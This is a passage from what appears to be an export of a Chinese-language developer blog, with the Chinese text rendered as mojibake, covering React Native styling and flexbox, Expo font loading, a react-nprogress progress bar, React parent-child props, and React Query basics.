'#fff' }}&gt; &lt;Text&gt;Some thing else.&lt;/Text&gt; &lt;/View&gt; );} é€™æ¨£æœ‰ä»€éº¼å·®å—ï¼Ÿ æœ‰å“¦ï¼åœ¨åªå‚³å…¥ç‰©ä»¶çš„æƒ…æ³ä¸‹ï¼Œå¦‚æœæˆ‘å¯«äº†ä¸å°çš„ key / value æ˜¯ä¸æœƒå™´éŒ¯èª¤çš„ã€‚ä½†å¦‚æœæ˜¯é€é StyleSheet.create() ä¾†å»ºç«‹çš„ç‰©ä»¶ï¼Œåªè¦æˆ‘æœ‰åœ°æ–¹å¯«éŒ¯ä»–å°±ä¸€å®šæœƒç·¨è­¯å¤±æ•—ä¸¦é¡¯ç¤ºéŒ¯èª¤ã€‚ æ‰€ä»¥ä¸€èˆ¬æœƒå»ºè­°ç”¨ StyleSheet.create() çš„æ–¹å¼ä¾†æ’°å¯«ï¼Œä½†å¦‚æœä½ çœŸçš„å¾ˆæ‡¶çš„è©±ç”¨ç´”ç‰©ä»¶çš„æ–¹å¼ä¹Ÿä¸æ˜¯ä¸è¡Œå•¦ã€‚ RN è£¡æ²’æœ‰ç¹¼æ‰¿çš„æ¦‚å¿µåœ¨ç¶“é CSS å¤šå¹´çš„æ‘§æ®˜ä¸‹ï¼Œå¦‚æœæˆ‘æƒ³è®“æ–‡å­—ç²—é«”ï¼Œå¯èƒ½æœƒä¸‹æ„è­˜é€™æ¨£å¯«ï¼š 1234567891011121314151617181920212223export default function App() { return ( &lt;View style={styles.container}&gt; &lt;View style={styles.header}&gt; &lt;Text&gt;Hello React Native&lt;/Text&gt; &lt;Text&gt;Hello React Native&lt;/Text&gt; &lt;Text&gt;Hello React Native&lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; );}const styles = StyleSheet.create({ container: { flex: 1, backgroundColor: '#fff', padding: 30, }, header: { backgroundColor: 'pink', fontWeight: 'bold' }}); ä½†é€™æ¨£æ˜¯æ²’ç”¨çš„ï¼Œæˆ‘ä¸€å®šè¦æŠŠé€™å€‹ fontWeight å¯«åœ¨ &lt;Text&gt; èº«ä¸Šæ‰æœ‰ç”¨ã€‚ é›–ç„¶æœ‰å€‹ä¾‹å¤–æƒ…å½¢ï¼Œå°±æ˜¯ &lt;Text&gt; è£¡é¢å†æ”¾ä¸€å€‹ &lt;Text&gt;ï¼Œåƒé€™æ¨£ï¼š 1234567891011121314151617181920212223export default function App() { return ( &lt;View style={styles.container}&gt; &lt;View style={styles.header}&gt; &lt;Text style={styles.parentText}&gt;Parent Text And&lt;Text&gt;Child Text&lt;/Text&gt;&lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; );}const styles = StyleSheet.create({ container: { flex: 1, backgroundColor: '#fff', padding: 30, }, header: { backgroundColor: 'pink', }, parentText: { fontWeight: 'bold' }}); é€™æ¨£çš„è©± Child Text å°±ä¹Ÿæœƒåƒåˆ°ç²—é«”çš„æ•ˆæœã€‚ ä½†é€™åªæ˜¯ä¾‹å¤–æƒ…å½¢ï¼Œä½ è¦çŸ¥é“å¤§å¤šæ•¸æƒ…å½¢ä¸‹é‚„æ˜¯ä¸æœƒæœ‰ã€Œç¹¼æ‰¿ã€çš„è§€å¿µçš„ã€‚ ç¾åœ¨ &lt;View&gt; å°±ç­‰æ–¼ flex-boxï¼Œ&lt;Text&gt; å°±ç­‰æ–¼ flex-itemï¼Œç¸½ä¹‹è¦çŸ¥é“é€™å€‹åœ¨ RN è£¡é¢æœ€åŸºæœ¬çš„é‹ä½œæ¨¡å¼ã€‚ é—œæ–¼å°ºå¯¸çš„å–®ä½å› ç‚ºè¦è€ƒæ…®ã€ŒScale Factorã€çš„é—œä¿‚ï¼Œæ‰€ä»¥å¯¦éš›çš„å¯¬å¯èƒ½è·Ÿä½ æƒ³å¾—ä¸ä¸€æ¨£ã€‚ åƒè€ƒé€™å¼µåœ–ï¼š ä¸€å€‹ iPhone4 çš„åƒç´ æ˜¯ 320 x 480ï¼Œä½† Scale Factor æ˜¯ã€Œ2xã€ï¼Œæ‰€ä»¥å¯¦éš›çš„è§£æåº¦æ˜¯ 640 x 960ï¼ˆä¹˜ä»¥äºŒï¼‰ã€‚ æ‰€ä»¥æˆ‘å¦‚æœæŠŠè—è‰²æ–¹å¡Šçš„å¯¬åº¦è¨­ç‚º 150ï¼Œå¯¦éš›åœ¨æ‰‹æ©Ÿä¸Šå°±æœƒæ˜¯ 300pxã€‚ ç¸½ä¹‹é€™é‚Šæ˜¯è¦è®“ä½ ææ¸…æ¥šå¦³è¨­å®šçš„ã€Œå€¼ã€ä»£è¡¨ä»€éº¼ï¼Ÿ å¦‚æœ Scale factor ç‚º 2ï¼Œå‰‡æ¯å€‹å–®ä½å°±ä»£è¡¨ 2px å¦‚æœ Scale factor ç‚º 3ï¼Œå‰‡æ¯å€‹å–®ä½å°±ä»£è¡¨ 3px çŸ¥é“é€™äº›å°±å¥½äº†ï¼Œä¸ç”¨ç‰¹åˆ¥å»èƒŒé€™äº›è¦æ ¼ã€‚å¦‚æœçœŸçš„ç¢°åˆ°å–®ä½çš„å•é¡Œï¼Œå¯ä»¥è©¦è‘—ç”¨ % çš„æ–¹å¼ä¾†è¨­å€¼ã€‚ Flexåœ¨ RN è£¡é¢ä¸»è¦æœƒç”¨ Flex çš„æ–¹å¼ä¾†æ’ç‰ˆï¼ˆä¹Ÿæ˜¯é è¨­çš„æ’ç‰ˆæ–¹å¼ï¼‰ï¼Œä¸»è¦æ¦‚å¿µéƒ½è·Ÿ CSS è£¡çš„ Flex box å·®ä¸å¤šï¼Œæ‰€ä»¥é€™é‚ŠåªæœƒæŠŠæˆ‘è¦ºå¾—å¹¾å€‹æ¯”è¼ƒç‰¹åˆ¥æˆ–éœ€è¦ç­è§£çš„è§€å¿µçµ¦è¨˜éŒ„ä¸‹ä¾†ã€‚ è¤‡ç¿’å¹¾å€‹ flex ç›¸é—œå±¬æ€§ flexBasis è¨­å®šç›¸å°æ–¼ã€Œä¸»è»¸ã€çš„å¯¬åº¦ï¼Œæœƒè¦†è“‹æ‰ width çš„è¨­å®š flexGrou æ ¹æ“šã€Œä¸»è»¸ã€çš„å‰©é¤˜ç©ºé–“ä¾†åˆ†é… ??? åˆ°é€™å€‹ item flexShrink æ ¹æ“šã€Œä¸»è»¸ã€çš„æº¢å‡ºç©ºé–“ä¾†å£“ç¸® ??? åˆ°é€™å€‹ item justifyContent è¨­å®š item çš„å°é½Šæ–¹å¼ï¼ˆæ ¹æ“šä¸»è»¸ï¼‰ alignItems è¨­å®š item çš„å°é½Šæ–¹å¼ï¼ˆæ ¹æ“šæ¬¡è»¸ï¼‰ flex: 1 é€™å€‹å…¶å¯¦æ˜¯åœ¨èªªflexGrow: 1 çš„æ„æ€ï¼Œåªæ˜¯å€‹ç°¡å¯« é™„è¨»ä¸€ä¸‹ RN è·Ÿ CSS ä¸åŒçš„å¹¾å€‹åœ°æ–¹ï¼š flexDirection çš„é è¨­å€¼æ˜¯ column flexShrink çš„é è¨­å€¼æ˜¯ 0 Directionåœ¨ React Native ä¸­ï¼Œå¦‚æœé€™æ¨£è¨­å®šï¼š 12345678910111213141516171819202122232425export default function App() { return ( &lt;View style={{ flex: 1, backgroundColor: '#fff' }}&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'dodgerblue' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'gold' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'tomato' }} /&gt; &lt;/View&gt; );} æœ€å¾Œå‡ºä¾†çš„æ±è¥¿æœƒæ˜¯ä¸‰å€‹ã€Œç›´å‘æ’åˆ—ã€çš„ itemï¼Œè·Ÿä½ åœ¨å¯« CSS çš„æ™‚å€™é‚„è »ä¸ä¸€æ¨£çš„å°å§ï¼Ÿå¦‚æœæ˜¯ CSS çš„è©±é è¨­æœƒæ˜¯ã€Œæ©«å‘æ’åˆ—ã€ã€‚ ç°¡å–®ä¾†èªªï¼Œé€™æ˜¯å› ç‚ºåœ¨ RN è£¡é¢ Flex é è¨­çš„æ–¹å‘æ˜¯ column è€Œä¸æ˜¯ row çš„é—œä¿‚ã€‚ ä»”ç´°æƒ³æƒ³çš„è©±ä¹Ÿè »åˆç†çš„ï¼Œç•¢ç«Ÿæˆ‘å€‘åœ¨ç”¨æ‰‹æ©Ÿçš„æ™‚å¾Œå¤§å¤šæ˜¯ä»¥ã€Œç›´å‘ã€ç‚ºä¸»ï¼Œæ‰€ä»¥æŠŠ Flex é è¨­æˆç›´å‘å¥½åƒä¹ŸæŒºç›´è¦ºçš„ï¼ alignContenté€™å€‹åªæœƒåœ¨æœ‰ flewWrap: wrap çš„æ™‚å€™æ‰æœ‰ä½œç”¨ï¼Œè¨˜å¾—é€™å€‹å°±å¥½äº†ï¼Œèˆ‰ä¾‹ä¾†èªªï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344export default function App() { return ( &lt;View style={{ flex: 1, flexDirection: 'row', justifyContent: 'center', flexWrap: 'wrap', // æ›è¡Œ alignContent: 'center', backgroundColor: '#fff' }}&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'dodgerblue' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'gold' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'tomato' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'dodgerblue' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'pink' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'black' }} /&gt; &lt;/View&gt; );} é€™æ™‚å€™çš„çµæœæ˜¯é•·é€™æ¨£ï¼š ä½†å¦‚æœæŠŠ alignContent æ‹¿æ‰çš„è©±å°±æœƒè®Šé€™æ¨£ï¼š ç°¡å–®ä¾†èªªï¼Œå¦‚æœä½ çš„ flex-box æœ‰å•Ÿç”¨ã€Œæ›è¡Œã€ï¼Œç„¶å¾Œä½ åˆæƒ³ã€ŒæŠŠè£¡é¢çš„ flex-item å…¨éƒ¨æ”¾åˆ°æ­£ä¸­å¤®ã€ï¼Œé‚£å°±æœƒéœ€è¦ alignContent è€Œä¸æ˜¯ alignItemsã€‚ alignItems æ˜¯ç”¨ä¾†è™•ç†ã€Œæ²’æœ‰æ›è¡Œã€çš„æ™‚å€™æ‰æœƒç”¨çš„å±¬æ€§ã€‚ Positionåœ¨ RN è£¡é¢ Position çš„é è¨­å€¼æ˜¯ relativeï¼Œæ‰€ä»¥æˆ‘å¯ä»¥ç›´æ¥é€™æ¨£å¯«ï¼š 1234567891011121314151617181920212223242526272829export default function App() { return ( &lt;View style={{ flex: 1, flexDirection: 'row', justifyContent: 'center', alignItems: 'center', backgroundColor: '#fff' }}&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'dodgerblue' }} /&gt; &lt;View style={{ top: 20, // ç›´æ¥ç”¨ top ä¾†åç§» width: 100, height: 100, backgroundColor: 'gold' }} /&gt; &lt;View style={{ width: 100, height: 100, backgroundColor: 'tomato' }} /&gt; &lt;/View&gt; );} è¼¸å‡ºçµæœï¼š ç”¨æ³•å…¶å¯¦éƒ½è·Ÿ CSS ä¸€æ¨£ï¼Œæ‰€ä»¥å°±ä¸ç‰¹åˆ¥ä»‹ç´¹æ€éº¼ç”¨äº†ã€‚é€™é‚Šåªæ˜¯æƒ³ç‰¹åˆ¥æä¸€ä¸‹é è¨­å€¼æ˜¯ relative é€™ä¸€é»ã€‚ è‡³æ–¼ absolute çš„è©±ä¹Ÿè·Ÿ CSS ä¸€æ¨£ï¼Œè¨˜å¾—åŠ ä¸Š position: 'absolute' ä¾†æ‰“é–‹ï¼Œç„¶å¾Œåˆ¤æ–·å¥½ã€Œçˆ¶å±¤çš„åƒè€ƒé»ã€å°±å¥½äº†ã€‚ é †é“ä¸€æï¼Œåœ¨ RN è£¡é¢ position å°±åªæœ‰é€™å…©ç¨®è€Œå·²ï¼Œä¸æœƒæœ‰ä»€éº¼ fixed æˆ– sticky è·Ÿ static é€™ç¨®æ±è¥¿ã€‚ è¼‰å…¥ FontFOIT è·Ÿ FOUT æ˜¯ä»€éº¼ï¼Ÿé™„è¨»ï¼šå¦‚æœä½ æƒ³çœ‹ç¯„ä¾‹çš„è©±å¯ä»¥åˆ° é€™é‚Š é€™é‚Šç§‘æ™®ä¸€ä¸‹å…©å€‹è¼‰å…¥å­—é«”çš„ä½¿ç”¨æ‰‹æ³•ï¼š FOIT å…ˆéš±è—æ‰€æœ‰æ–‡å­—å…§å®¹ï¼Œç­‰è¼‰å…¥å®Œæˆå¾Œæ‰é¡¯ç¤ºï¼ˆä½†å…¶ä»–çš„æ±è¥¿ä¸€é–‹å§‹æœƒè¢«é¡¯ç¤ºï¼‰ FOUT å…ˆé¡¯ç¤ºé è¨­å­—å‹ï¼Œç­‰è¼‰å…¥å¾Œå†æ›´æ–°æˆæ–°çš„å­—å‹ ç°¡å–®ä¾†èªªå°±æ˜¯ä¸åŒçš„è¨­è¨ˆå“²å­¸è€Œå·²ï¼Œé‚„è »æœ‰è¶£çš„ã€‚ ç¬¬ä¸€ç¨®åšæ³•ï¼ˆhookï¼‰é€™ç¨®ä½œæ³•æ˜¯é€é hook ä¾†åšçš„ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ï¼š å…ˆä¸‹è¼‰å­—å‹çš„ packageï¼Œ@expo-google-fonts/{googleFont} æ¥è‘—ç”¨ä¸‹é¢çš„æ–¹å¼ä¾†ä½¿ç”¨å³å¯ é™„è¨»ï¼šå‡è¨­ &lt;Home /&gt; è£¡é¢æœ‰ç”¨åˆ°æˆ‘å€‘æŒ‡å®šçš„å­—å‹ã€‚ 123456789101112131415161718import AppLoading from 'expo-app-loading';import Home from './screens/Home';import { useFonts, Nunito_400Regular, Nunito_700Bold } from \"@expo-google-fonts/nunito\";export default function App() { let [fontsLoaded] = useFonts({ Nunito_400Regular, Nunito_700Bold }) if (!fontsLoaded) { return &lt;AppLoading /&gt; } return ( &lt;Home /&gt; );} useFonts æœƒå›å‚³ä¸€å€‹é™£åˆ—ï¼Œé™£åˆ—çš„ç¬¬ä¸€å€‹å€¼æ˜¯ booleanï¼Œä»£è¡¨é€™å­—å‹è¼‰å…¥å®Œäº†æ²’ï¼Ÿ æ¥è‘—ä¸‹é¢å¯«äº†ä¸€å€‹ if åˆ¤æ–·ï¼Œæ„æ€å°±æ˜¯å¦‚æœé‚„åœ¨è¼‰å…¥å°±é¡¯ç¤º &lt;AppLoading /&gt;ï¼Œç­‰åˆ°è¼‰å…¥å®Œä»¥å¾Œæ‰é¡¯ç¤º &lt;Home /&gt;ã€‚ é›–ç„¶é‚„è »å¥½å¥‡ä»–æ˜¯æ€éº¼æ›´æ–° fontsLoaded é€™å€‹ state ç„¶å¾Œè§¸ç™¼ re-render çš„ï¼Œä¸éé€™ç¢ºå¯¦æ˜¯å¯è¡Œçš„ï¼ä¹Ÿæ˜¯æœ€ç°¡æ½”çš„åšæ³•ã€‚ ç¬¬äºŒç¨®åšæ³•ï¼ˆFont.loadAsyncï¼‰é€™æ‡‰è©²ç®—æ˜¯æ¯”è¼ƒèˆŠçš„åšæ³•ï¼Œä¸éä¹Ÿæ˜¯èƒ½åƒè€ƒä¸€ä¸‹ï¼š é™„è¨»ï¼šFont.loadAsync ä¹Ÿå¯ä»¥è¼‰å…¥å¤–éƒ¨è³‡æºï¼Œåªè¦æŠŠ require æ”¹æˆå°æ‡‰çš„ URI å°±è¡Œäº† 1234567891011121314151617181920212223242526272829import AppLoading from 'expo-app-loading';import Home from './screens/Home';import { useState } from 'react';import * as Font from \"expo-font\";export default function App() { const [fontsLoaded, setFontsLoaded] = useState&lt;boolean&gt;(false); const getFonts = () =&gt; { return Font.loadAsync({ 'Nunito_400Regular': require('./assets/fonts/Nunito-Regular.ttf'), 'Nunito_700Bold': require('./assets/fonts/Nunito-Bold.ttf'), }); } if (!fontsLoaded) { return ( &lt;AppLoading startAsync={getFonts} onFinish={() =&gt; setFontsLoaded(true)} onError={(error) =&gt; console.log('error', error)} /&gt; ) } return ( &lt;Home /&gt; );} è·Ÿç¬¬ä¸€ç¨®ä½œæ³•å·®ä¸å¤šï¼Œåªæ˜¯ state è·Ÿ call function çš„éƒ¨åˆ†å¾—è‡ªå·±ä¾†ï¼š getFonts ç”¨ä¾†è¼‰å…¥å­—å‹çš„ function &lt;AppLoading startAsync={getFonts}&gt; å» call è¼‰å…¥å­—å‹çš„ function &lt;AppLoading onFinish={() =&gt; setFontsLoaded(true)}&gt; è¼‰å…¥å®Œæˆå¾Œæ›´æ–° state è¨­å®š Iconé™„è¨»ï¼šå®˜æ–¹æ–‡ä»¶ï¼ˆå¯æŸ¥è©¢ icon åç¨±ï¼‰ é—œæ–¼ Icon çš„éƒ¨åˆ†ï¼Œåœ¨æˆ‘å€‘ç”¨ expo init å°ˆæ¡ˆçš„æ™‚å€™å…¶å¯¦å°±æœƒé †ä¾¿è¼‰å…¥ç›¸é—œçš„å¥—ä»¶äº†ï¼Œæ‰€ä»¥æˆ‘å€‘åªè¦ç›´æ¥ import é€²ä¾†ç”¨å°±å¯ä»¥äº†ï¼Œåƒé€™æ¨£ï¼š 1234567import { MaterialIcons } from '@expo/vector-icons';export default function TodoList({ todos, removeTodo }) { return ( &lt;MaterialIcons name=\"delete\" size={24} color=\"#333\" /&gt; )}","link":"/2022/05/27/react-native-style-and-layout/"},{"title":"react-nprogress æ‡¶äººåŒ…","text":"å¾ˆ fancy çš„æ•ˆæœã€‚ ç°¡è¿°é€™æ˜¯æœ€è¿‘ç¢°åˆ°çš„ä¸€å€‹å¥—ä»¶ï¼Œå› ç‚ºè¦ºå¾—é‚„ä¸éŒ¯ç”¨æ‰€ä»¥é †ä¾¿è¨˜éŒ„ä¸€ä¸‹ã€‚ æƒ³çŸ¥é“æ›´å¤šç´°ç¯€å¯ä»¥åˆ° å®˜æ–¹æ–‡ä»¶ ä¾†çœ‹ï¼Œæˆ‘è¦ºå¾—å¯«å¾—å¾ˆä¸éŒ¯ï¼Œæ¨ä¸€å€‹ï¼ ç”¨æ³•1. å»ºç«‹ CSS å‹•ç•«å› ç‚ºã€Œè½‰åœˆåœˆã€çš„å…ƒä»¶æ˜¯é€é CSS å‹•ç•«ä¾†å¯¦ä½œçš„ï¼Œæ‰€ä»¥è¦è¨˜å¾—é–‹ä¸€æ”¯ CSS ä¾†å¯«å…¥ä»¥ä¸‹å…§å®¹ï¼š 12345678@keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); }} 2. å»ºç«‹æ‰€éœ€çš„å…ƒä»¶ç°¡å–®ä¾†èªªæˆ‘å€‘è¦å»ºç«‹ä¸€å€‹ Progress å…ƒä»¶ï¼Œé€™å€‹å…ƒä»¶ä¸­é‚„æœƒåŒ…å«å…¶ä»–å…ƒä»¶ï¼Œåˆ†åˆ¥ç‚º Barã€Container å’Œ Spinnerï¼Œä¸å¤ªæ‡‚çš„è©±ç›´æ¥ code å§ï¼š 12345678910111213141516171819202122232425import { useNProgress } from '@tanem/react-nprogress'import Bar from './Bar'import Container from './Container'import Spinner from './Spinner'export default function Progress({ animationDuration, incrementDuration, isAnimating, minimum }) { // å¥—ä»¶æä¾›çš„ hook // isFinished = æ˜¯å¦é¡¯ç¤ºé€²åº¦æ¢ // progress = é€²åº¦æ¢ç•¶ä¸‹çš„é•·åº¦ const { isFinished, progress } = useNProgress({ animationDuration, incrementDuration, isAnimating, minimum }) // æœ€å¾Œå›å‚³ template return ( &lt;Container animationDuration={animationDuration} isFinished={isFinished}&gt; &lt;Bar animationDuration={animationDuration} progress={progress} /&gt; &lt;Spinner /&gt; &lt;/Container&gt; )} ç°¡å–®ä¾†èªªå°±æ˜¯æŠŠ Progress æ¥æ”¶çš„ props å‚³çµ¦ useNProgressï¼ˆç•¶ä½œ confiï¼‰ï¼Œç„¶å¾Œå†æŠŠå°æ‡‰çš„ state æ”¾åˆ° template ä¸Šå°±è¡Œäº†ã€‚ è‡³æ–¼ template çš„å…§å®¹æˆ‘ä¸€ä½µé™„ä¸Šï¼š Container.jsx 123456789101112131415import React from 'react'const Container = ({ animationDuration, children, isFinished }) =&gt; ( &lt;div style={{ opacity: isFinished ? 0 : 1, pointerEvents: 'none', transition: `opacity ${animationDuration}ms linear` }} &gt; {children} &lt;/div&gt;)export default Container Bar.jsx 123456789101112131415161718192021222324252627282930const Bar = ({ animationDuration, progress }) =&gt; ( &lt;div style={{ background: '#29d', height: 2, left: 0, marginLeft: `${(-1 + progress) * 100}%`, position: 'fixed', top: 0, transition: `margin-left ${animationDuration}ms linear`, width: '100%', zIndex: 1031 }} &gt; &lt;div style={{ boxShadow: '0 0 10px #29d, 0 0 5px #29d', display: 'block', height: '100%', opacity: 1, position: 'absolute', right: 0, transform: 'rotate(3deg) translate(0px, -4px)', width: 100 }} /&gt; &lt;/div&gt;)export default Bar Spinner.jsx 123456789101112131415161718192021222324252627import React from 'react'const Spinner = () =&gt; ( &lt;div style={{ display: 'block', position: 'fixed', right: 15, top: 15, zIndex: 1031 }} &gt; &lt;div style={{ animation: '400ms linear infinite spinner', borderBottom: '2px solid transparent', borderLeft: '2px solid #29d', borderRadius: '50%', borderRight: '2px solid transparent', borderTop: '2px solid #29d', boxSizing: 'border-box', height: 18, width: 18 }} /&gt; &lt;/div&gt;) 3. æ‹¿ä¾†ç”¨ï¼ˆçµæŸï¼‰12345678910111213141516171819202122import './Home.css'import React from 'react'import { useFetch } from 'hooks/useFetch'import RecipeList from 'components/RecipeList'import Progress, { progressProps } from 'components/Progress'export default function Home() { const { data, isPending, error } = useFetch('http://localhost:3000/recipes') return ( &lt;div className='home'&gt; &lt;Progress isAnimating={isPending} animationDuration={progressProps.animationDuration} incrementDuration={progressProps.incrementDuration} minimum={0} /&gt; {isPending &amp;&amp; &lt;div className='loading'&gt;Loading...&lt;/div&gt;} {error &amp;&amp; &lt;div className='error'&gt;{error}&lt;/div&gt;} {data &amp;&amp; &lt;RecipeList recipes={data} /&gt;} &lt;/div&gt; )} åªè¦æŠŠ Ajax çš„ loading ç‹€æ…‹ç•¶ä½œ props å‚³å…¥å°±å¤§åŠŸå‘Šæˆå›‰ï½ è£œå……ï¼šæ¯å€‹ props çš„ç”¨é€” isAnimating: boolean æ˜¯å¦é¡¯ç¤ºé€²åº¦æ¢ animationDuration: number å¾é–‹å§‹åˆ°çµæŸçš„æ™‚é–“ (ms) incrementDuration: number é€²åº¦æ¢éå¢çš„é–“éš”æ™‚é–“ï¼ˆmsï¼‰ minimum: number é€²åº¦æ¢çš„èµ·å§‹é»ï¼ˆ0~1ï¼‰","link":"/2022/06/18/react-nprogress/"},{"title":"React çˆ¶å­å…ƒä»¶é–“çš„æºé€š","text":"æ„Ÿè¦ºåœ¨æ¯å€‹æ¡†æ¶éƒ½å¾—å­¸çš„è§€å¿µã€‚ ç°¡è¿°é€™é‚Šæœƒæ‹¿æˆ‘åšçš„åƒåœ¾ Todo list ä¾†ç•¶ç¯„ä¾‹ï¼š å®ƒçš„çµæ§‹é•·é€™æ¨£ï¼š 123456789101112131415161718192021222324252627function App() { const [todos, setTodos] = useState([ { id: 0, content: 'åƒé£¯', isDone: true }, { id: 1, content: 'å¯«æ–‡ç« ', isDone: false }, { id: 2, content: 'å¯«ç¨‹å¼', isDone: false }, ]) return ( &lt;div style={rootStyle}&gt; &lt;TodoHeader addTodo={addTodo}&gt;&lt;/TodoHeader&gt; {todos.map(todo =&gt; &lt;TodoItem key={todo.id} todo={todo}&lt;/TodoItem&gt;)} &lt;/div&gt; );} å¦‚æœæ‡¶å¾—çœ‹ code çš„è©±ï¼Œé‚£å°±åƒè€ƒä¸‹é¢ï¼š App TodoHeaderï¼ˆä¸Šé¢çš„è¼¸å…¥å€å¡Šï¼‰ TodoItemï¼ˆä¸‹é¢çš„ Todo åˆ—è¡¨ï¼‰ ç¾åœ¨çš„å•é¡Œæ˜¯ï¼Œã€Œå¦‚æœ Todo çš„ç‹€æ…‹æ˜¯å„²å­˜åœ¨ App ä¸Šï¼Œé‚£æˆ‘æŒ‰ä¸‹åˆªé™¤æŒ‰éˆ•æ™‚è¦æ€éº¼å»æ”¹åˆ° App çš„ Stateï¼Ÿã€ å…¶å¯¦è§£æ³•é‚„è »ç›´è¦ºçš„ï¼Œåªæ˜¯è¦ç¨å¾®æƒ³ä¸€ä¸‹å°±æ˜¯äº†ã€‚ æ—¢ç„¶æˆ‘å€‘å¯ä»¥é€é props æŠŠæ±è¥¿å‚³åˆ°å­å…ƒä»¶ä¸Šï¼Œé‚£æˆ‘ç›´æ¥å‚³ä¸€å€‹ function ä¸å°±å¥½äº†å—ï¼Ÿ åƒæ˜¯é€™æ¨£ï¼š 12345678910111213141516171819202122232425262728293031323334function App() { const [todos, setTodos] = useState([ { id: 0, content: 'åƒé£¯', isDone: true }, { id: 1, content: 'å¯«æ–‡ç« ', isDone: false }, { id: 2, content: 'å¯«ç¨‹å¼', isDone: false }, ]) // ç”¨ä¾†è®Šæ›´ state çš„ function // é æœŸæœƒå‚³å…¥ä¸€å€‹ id const handleRemoveTodo = id =&gt; { setTodos(todos.filter(todo =&gt; todo.id !== id)) } return ( &lt;div style={rootStyle}&gt; // é€é props å‚³çµ¦å­å±¤ &lt;TodoHeader handleRemoveTodo={handleRemoveTodo}&gt;&lt;/TodoHeader&gt; {todos.map(todo =&gt; &lt;TodoItem key={todo.id} todo={todo}&lt;/TodoItem&gt;)} &lt;/div&gt; );} æ¥è‘—å°±å¯ä»¥åœ¨å­å±¤æ¥åˆ°é€™å€‹ propsï¼š 1234567891011121314151617181920212223// æ¥æ”¶ propsfunction TodoItem ({ todo, handleRemoveTodo }) { // æŒ‰ä¸‹æŒ‰éˆ•çš„ handler const handleButtonClick = () =&gt; { // å» call çˆ¶å±¤å‚³é€²ä¾†çš„ functionï¼Œä¸¦å¸¶å…¥ id handleRemoveTodo(Number(e.target.getAttribute('data-id'))) } return ( &lt;TodoItemWrapper&gt; &lt;TodoContent&gt;{todo.content}&lt;/TodoContent&gt; &lt;TodoButtonWrapper&gt; &lt;GreenButton isDone={todo.isDone} data-id={todo.id} onClick={handleButtonClick}&gt;{todo.isDone ? 'å·²å®Œæˆ' : 'æœªå®Œæˆ'} &lt;/GreenButton&gt; &lt;RedButton data-id={todo.id}&gt;åˆªé™¤&lt;/RedButton&gt; &lt;/TodoButtonWrapper&gt; &lt;/TodoItemWrapper&gt; )} å¦‚æ­¤ä¸€ä¾†ï¼Œå°±å¯ä»¥å¾å­å±¤å»æ”¹è®Šçˆ¶å±¤çš„ stateï¼Œé€™å°±æ˜¯å…ƒä»¶ä¹‹é–“çš„æºé€šæ–¹å¼ï¼Œé€é propsã€‚","link":"/2022/04/06/react-parent-and-child-communication/"},{"title":"è®“ API æ‰“å¾—æ›´é †æ‰‹ï¼React Query","text":"å¸Œæœ›æœ‰æ©Ÿæœƒçš„è©±èƒ½å¯¦éš›ç”¨ç”¨çœ‹ã€‚ ç½®é ‚ Noteç›¸é—œçš„ç‹€æ…‹ isLoading æ˜¯å¦æ‹¿åˆ° response äº†ï¼ˆæ³¨æ„ï¼Œå¦‚æœæœ‰å¿«å–çš„è©±å°±ç®—æ­£åœ¨æŠ“ä¹Ÿæœƒæ˜¯ falseï¼‰ isFetching æ˜¯å¦æ‹¿åˆ° response äº†ï¼ˆä¸æœƒç®¡æœ‰æ²’æœ‰å¿«å–ï¼‰ æ‡¶äººåŒ…ï¼šå¦‚æœä½ ä¸ç®¡æœ‰æ²’æœ‰ cache éƒ½è¦é¡¯ç¤º Loading çš„è©±ï¼Œè«‹ä¸€å¾‹ç”¨ isFetching ä¾†ç•¶ä½œä½ çš„ flagï¼ŒisLoading çš„æœ¬æ„åªæ˜¯ç‚ºäº†è®“ä½ åˆ©ç”¨ cache ä¾†æ¸›å°‘ç­‰å¾… Loading çš„æ¬¡æ•¸ã€‚ Global Configæœ‰äº› config çš„é è¨­å€¼å¯èƒ½ä¸æ˜¯æˆ‘å€‘è¦çš„ï¼Œé€™æ™‚å€™æˆ‘å€‘é™¤äº†åœ¨æ¯ä¸€æ¬¡ä½¿ç”¨ useQuery çš„æ™‚å€™å»èª¿æ•´ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨ Global åšè¨­å®šã€‚ è¨­å®šçš„æ–¹æ³•å¦‚ä¸‹ï¼š 12345678910111213function App() { // global è¨­å®š const queryClient = new QueryClient({ defaultOptions: { queries: { retry: false, refetchOnWindowFocus: false } } }) return &lt;QueryClientProvider client={queryClient}&gt;{/* ç•¥ */}&lt;/QueryClientProvider&gt;} useQuery æœ€åŸºæœ¬çš„ç”¨æ³•åŸºæœ¬ä¸Šä½ è¦æ‰“ GET è«‹æ±‚çš„è©±éƒ½æœƒç”¨é€™å€‹ hookã€‚ï¼ˆå¦‚æœæ˜¯éœ€è¦ç”¨ POST å¸¶åƒæ•¸ä¾†æ‹¿çš„é‚£ç¨®ä¹Ÿè¡Œå•¦ï¼‰ useQuery æœƒæ¥æ”¶ä¸‰å€‹åƒæ•¸ï¼š key ç”¨ä¾†å€åˆ†æ¯ä¸€å€‹è«‹æ±‚ï¼ˆä¸€å€‹çš„è©±å‚³å­—ä¸²ï¼Œå¤šå€‹çš„è©±å‚³é™£åˆ—ï¼‰ fetcher ä½ è¦ call api çš„é‚£å€‹ functionï¼ˆæœƒå›å‚³ä¸€å€‹ Promise çš„é‚£ç¨®ï¼‰ config ç”¨ä¾†èª¿æ•´é…ç½®çš„ç‰©ä»¶ 12345678910111213141516171819202122232425import axios from 'axios'import { useQuery } from 'react-query'const getHeros = () =&gt; axios.get('http://localhost:4000/superheroes1')export const RQSuperHeroesPage = () =&gt; { const { isLoading, data, isError, error } = 